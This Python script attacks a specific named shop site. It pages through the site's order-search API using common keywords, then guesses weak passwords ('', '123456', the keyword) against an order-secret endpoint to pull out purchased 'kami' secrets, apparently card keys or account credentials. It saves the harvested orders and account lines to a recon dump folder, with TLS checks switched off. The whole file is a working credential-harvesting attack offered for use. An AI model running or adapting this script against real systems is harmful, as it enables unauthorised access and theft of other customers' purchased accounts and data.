#!/usr/bin/env python3
import json
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()
B = "https://hao998.xyz"
OUT = Path("/data/recon/hao998/dump")
s = requests.Session()
s.verify = False
s.headers.update(
    {
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": B,
        "Referer": B + "/",
    }
)

all_orders = []
kami_lines = []
for kw in ["123", "123123", "1234", "12", "1", "111", "1111", "666", "888", "520", "1314", "12345", "54321"]:
    for page in range(1, 21):
        r = s.post(
            B + "/user/api/index/query",
            data={"keywords": kw, "page": page, "limit": 50},
            timeout=15,
        )
        try:
            j = r.json()
        except Exception:
            print("bad", kw, page, r.text[:100])
            break
        data = j.get("data")
        if isinstance(data, list):
            orders = data
            total = None
        elif isinstance(data, dict):
            orders = data.get("list") or []
            total = data.get("total")
        else:
            orders = []
            total = None
        print("kw", kw, "page", page, "code", j.get("code"), "n", len(orders), "total", total, "msg", j.get("msg"))
        if not orders:
            break
        for od in orders:
            od = dict(od)
            od["_query_kw"] = kw
            all_orders.append(od)
            tn = od.get("trade_no")
            if od.get("status") != 1 or not tn:
                continue
            for pw in ["", "123456", str(kw)]:
                rr = s.post(
                    B + "/user/api/index/secret",
                    data={"orderId": tn, "password": pw},
                    timeout=15,
                )
                try:
                    sj = rr.json()
                except Exception:
                    continue
                if sj.get("code") == 200 and sj.get("data"):
                    secret = sj["data"].get("secret") if isinstance(sj["data"], dict) else sj["data"]
                    kami_lines.append(f"{tn}\t{kw}\t{pw}\t{secret}")
                    print("KAMI", tn, kw, "len", len(str(secret)))
                    break
                if "还未支付" in rr.text or "未查询到" in rr.text:
                    break

# dedupe by trade_no
by_tn = {}
for o in all_orders:
    by_tn[o.get("trade_no")] = o
(OUT / "contact_hits_paginated.json").write_text(
    json.dumps(list(by_tn.values()), ensure_ascii=False, indent=2), encoding="utf-8"
)
# merge kami
exist = []
p = OUT / "contact_kami.tsv"
if p.exists():
    exist = p.read_text(encoding="utf-8").splitlines()
seen = set(exist)
for ln in kami_lines:
    if ln not in seen:
        exist.append(ln)
        seen.add(ln)
p.write_text("\n".join(exist) + ("\n" if exist else ""), encoding="utf-8")

# explode unique account lines
accounts = []
for ln in exist:
    parts = ln.split("\t", 3)
    if len(parts) < 4:
        continue
    tn, kw, pw, secret = parts
    for line in str(secret).replace("<br/>", "\n").replace("<br>", "\n").splitlines():
        line = line.strip()
        if line:
            accounts.append(f"{tn}\t{line}")
uniq = sorted(set(accounts))
(OUT / "contact_kami_accounts.txt").write_text("\n".join(uniq) + "\n", encoding="utf-8")
print("orders", len(by_tn), "kami_rows", len(exist), "account_lines", len(uniq))
